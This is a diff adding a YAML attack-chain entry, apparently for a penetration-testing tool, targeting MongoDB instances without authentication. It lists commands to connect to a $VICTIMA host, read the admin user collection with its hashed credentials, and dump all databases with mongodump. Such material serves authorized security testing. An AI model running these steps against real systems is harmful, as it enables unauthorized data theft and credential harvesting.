@@ -1,0 +1,36 @@
+chain_id: mongodb_no_auth
+title: "MongoDB — anonymous read every collection"
+severity: HIGH
+tags: [mongodb, no-auth, nosql, data-disclosure]
+
+trigger:
+  any_of:
+    - { port: 27017 }
+    - { port: 27018 }
+    - { service_pattern: "(?i)mongodb|mongo" }
+
+description: |
+  Open MongoDB without auth (the default before 3.x and still very
+  common in lab/dev environments). The admin database often holds the
+  user collection with hashed credentials reusable on the host's SSH /
+  webapp / RDP.
+
+steps:
+  - id: 1
+    title: "Connect"
+    command: mongosh mongodb://$VICTIMA:27017
+
+  - id: 2
+    title: "List databases and collections"
+    command: |
+      show dbs
+      use admin
+      show collections
+      db.system.users.find()
+
+  - id: 3
+    title: "Dump everything"
+    command: mongodump --host $VICTIMA --port 27017 --out ./mongo-dump
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb
